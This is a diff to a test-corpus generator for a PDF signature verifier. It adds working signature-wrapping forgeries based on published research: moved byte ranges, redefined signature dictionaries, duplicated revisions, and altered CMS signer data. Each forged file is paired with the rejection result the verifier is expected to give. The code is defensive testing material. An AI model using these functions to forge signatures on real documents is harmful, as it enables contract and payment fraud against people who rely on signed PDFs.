@@ -369,6 +369,145 @@ def add_annotation(data):
     return append_update(data, {3: page, n: note})
 
 
+# ----------------------------------------------------------------------------- signature wrapping
+# Built from the published descriptions of signature wrapping and universal signature
+# forgery (Mladenov, Mainka, Meyer zu Selhausen, Grothe, Schwenk: "1 Trillion Dollar
+# Refund: How To Spoof PDF Signatures", CCS 2019, and its vulnerability report), not from
+# any code (`VER-03`, Phase 1 exit item 4).
+
+EVIL_TEXT = b"BT /F1 18 Tf 72 720 Td (Agreement: pay 1000000 EUR) Tj ET\n"
+
+
+def evil_content():
+    return b"<< /Length %d >>\nstream\n" % len(EVIL_TEXT) + EVIL_TEXT + b"\nendstream"
+
+
+def sig_dict_number(data):
+    """The object number of the (last) signature dictionary holding a /ByteRange."""
+    m, _ = byte_range(data)
+    head = re.findall(rb"(?<![0-9])(\d+) 0 obj\s*<<", data[:m.start()])
+    if not head:
+        raise SystemExit("gen.py: signature dictionary not found")
+    return int(head[-1])
+
+
+def wrap_moved_range(data):
+    """Signature wrapping: the second signed range is copied to the end of the file and
+    the ByteRange rewritten to point at the copy, so the signed bytes are unchanged and
+    still reach the end of the file. The gap then holds the original /Contents, the
+    signature revision's tail with its xref (which `startxref` in the copy still names)
+    rewritten to give obj 5, the page content, a new body also in the gap. A verifier that
+    only hashes the ByteRange and checks it reaches the end of the file accepts it."""
+    m, (a, b, c, d) = byte_range(data)
+    if c + d != len(data):
+        raise SystemExit("gen.py: wrapping needs the signature in the last revision")
+    tail = data[c:]
+    xref_at = int(re.findall(rb"startxref\s+(\d+)", tail)[-1]) - c
+    if not 0 < xref_at < len(tail):
+        raise SystemExit("gen.py: the signature revision's xref is not in the second range")
+    head, xref = tail[:xref_at], tail[xref_at:]
+    t = xref.index(b"trailer")
+    # obj 5 at its new offset: after the rewritten tail, which keeps its length.
+    evil_at = c + len(head) + len(xref) + len(b"5 1\n0000000000 00000 n \n")
+    xref = xref[:t] + b"5 1\n%010d 00000 n \n" % evil_at + xref[t:]
+    evil = b"5 0 obj\n" + evil_content() + b"\nendobj\n"
+    c2 = c + len(head) + len(xref) + len(evil)
+    br = re.search(rb"/ByteRange\s*\[[^\]]*\]\s*", head)
+    new = b"/ByteRange [%d %d %d %d]" % (a, b, c2, d)
+    if len(new) > len(br.group()):
+        raise SystemExit("gen.py: rewritten ByteRange does not fit")
+    head = head[:br.start()] + new.ljust(len(br.group())) + head[br.end():]
+    out = data[:c] + head + xref + evil + tail
+    assert len(out) == c2 + d and out[c2:] == tail
+    return out
+
+
+def wrap_moved_dict(data, content=True):
+    """A moved signature dictionary: a later revision redefines the signature dictionary
+    object (same /ByteRange, same /Contents, so the old copy still sits in the gap), and
+    with `content` the page content too; without, the moved copy claims another signer
+    name and signing time. The dictionary a reader resolves is no longer the one whose
+    /Contents the ByteRange leaves out."""
+    n = sig_dict_number(data)
+    body = current_body(data, n)
+    if content:
+        return append_update(data, {n: body, 5: evil_content()})
+    moved = re.sub(rb"/M \([^)]*\)", b"/M (D:20250101000000Z) /Name (Mallory)", body)
+    if moved == body:
+        raise SystemExit("gen.py: no /M in the signature dictionary")
+    return append_update(data, {n: moved})
+
+
+def wrap_duplicate_revision(data):
+    """A duplicated revision: a complete second copy of every object, with the page
+    content replaced, and a cross-reference section with no /Prev, appended after the
+    signed file. The signature dictionary in the copy keeps the original ByteRange, which
+    still covers the original revision byte for byte, while the document a reader shows
+    is the copy."""
+    _, size = last_xref_and_size(data)
+    objects = {}
+    for n in range(1, size):
+        try:
+            objects[n] = current_body(data, n)
+        except SystemExit:
+            continue
+    objects[5] = evil_content()
+    out = bytearray(data)
+    offsets = {}
+    for n, body in sorted(objects.items()):
+        offsets[n] = len(out)
+        out += b"%d 0 obj\n" % n + body + b"\nendobj\n"
+    xref = len(out)
+    out += b"xref\n0 %d\n0000000000 65535 f \n" % size
+    for n in range(1, size):
+        out += (b"%010d 00000 n \n" % offsets[n]) if n in offsets else b"0000000000 65535 f \n"
+    out += b"trailer\n<< /Size %d /Root 1 0 R >>\nstartxref\n%d\n%%%%EOF\n" % (size, xref)
+    return bytes(out)
+
+
+def replace_cms(data, der):
+    """Put `der` in the last signature's /Contents (the unsigned gap), zero-padded."""
+    _, (a, b, c, d) = byte_range(data)
+    room = c - 1 - (b + 1)
+    h = der.hex().upper().encode()
+    if len(h) > room:
+        raise SystemExit(f"gen.py: CMS of {len(der)} bytes does not fit /Contents")
+    return data[:b + 1] + h.ljust(room, b"0") + data[c - 1:]
+
+
+def cms_of(data):
+    from asn1crypto import cms
+
+    _, (a, b, c, d) = byte_range(data)
+    return cms.ContentInfo.load(bytes.fromhex(data[b + 1:c - 1].decode()), strict=False)
+
+
+def wrap_two_signers(data, other):
+    """A CMS with an extra SignerInfo: the original, valid one first, then the signer
+    of `other` with its certificates. PAdES allows exactly one (ETSI EN 319 142-1 §6.3);
+    a verifier that checks only the first, or any one, is wrapped."""
+    from asn1crypto import cms
+
+    ci, extra = cms_of(data), cms_of(other)
+    sd, xd = ci["content"], extra["content"]
+    sd["signer_infos"] = cms.SignerInfos([sd["signer_infos"][0], xd["signer_infos"][0]])
+    sd["certificates"] = cms.CertificateSet(list(sd["certificates"]) + list(xd["certificates"]))
+    return replace_cms(data, ci.dump(force=True))
+
+
+def wrap_econtent(data, work):
+    """A CMS with eContent present: an attached signature by the trusted signer over
+    other bytes, in place of the detached one. Valid as a CMS on its own, so a verifier
+    that verifies the CMS against its eContent instead of the ByteRange is wrapped;
+    `ETSI.CAdES.detached` requires eContent to be absent."""
+    from pyhanko.sign import signers
+
+    signer = signers.SimpleSigner.load(str(work / "signer.key"), str(work / "signer.pem"),
+                                       ca_chain_files=(str(work / "inter.pem"),))
+    ci = asyncio.run(signer.async_sign_general_data(EVIL_TEXT, "sha256", detached=False, use_cades=True))
+    return replace_cms(data, ci.dump())
+
+
 # ----------------------------------------------------------------------------- build
 
 def build():
@@ -393,6 +532,7 @@ def build():
 
         P, TRY, NOCHAIN = "TOTAL_PASSED", "INDETERMINATE:TRY_LATER", "INDETERMINATE:NO_CERTIFICATE_CHAIN_FOUND"
         MOD = "TOTAL_FAILED:DISALLOWED_MODIFICATION"
+        FORMAT = "TOTAL_FAILED:FORMAT_FAILURE"
 
         bb = sign(plain, work)
         put("b-b.pdf", bb, [(0, TRY, "intact", "PAdES B-B, no revocation data")])
@@ -460,6 +600,21 @@ def build():
         cat = current_body(sh, 1).replace(b"/Pages 2 0 R", b"/Pages 9 0 R")
         put("shadow-hide-and-replace.pdf", append_update(sh, {1: cat}),
             [(0, MOD, "modified", "hide-and-replace: catalog points at the shadow page tree")])
+
+        # Signature wrapping (VER-03): each would pass a verifier that only hashes the
+        # ByteRange and verifies the CMS it finds.
+        put("wrap-moved-range.pdf", wrap_moved_range(bt),
+            [(0, FORMAT, "invalid", "signature wrapping: second signed range moved to the end, gap holds a new page content; pyHanko finds the hash intact and reports coverage UNCLEAR, modification OTHER", "modified")])
+        put("wrap-moved-dict.pdf", wrap_moved_dict(blt),
+            [(0, MOD, "modified", "moved signature dictionary: redefined in a later revision with the page content")])
+        put("wrap-moved-dict-only.pdf", wrap_moved_dict(blt, content=False),
+            [(0, MOD, "modified", "moved signature dictionary alone: the redefined copy claims another signer name and time")])
+        put("wrap-duplicate-revision.pdf", wrap_duplicate_revision(blt),
+            [(0, FORMAT, "invalid", "duplicated revision without /Prev: ByteRange covers the original, the reader shows the copy; pyHanko finds the hash intact and reports modification OTHER", "modified")])
+        put("wrap-cms-two-signers.pdf", wrap_two_signers(blt, out["untrusted.pdf"]),
+            [(0, FORMAT, "invalid", "CMS with a second SignerInfo (an untrusted signer) after the valid one")])
+        put("wrap-cms-econtent.pdf", wrap_econtent(blt, work),
+            [(0, FORMAT, "invalid", "CMS with eContent: an attached signature by the trusted signer over other bytes")])
 
         (HERE / "trust-root.pem").write_bytes(c["root"].public_bytes(__import__("cryptography").hazmat.primitives.serialization.Encoding.PEM))
         (HERE / "trust-root.der").write_bytes(c["root"].public_bytes(__import__("cryptography").hazmat.primitives.serialization.Encoding.DER))
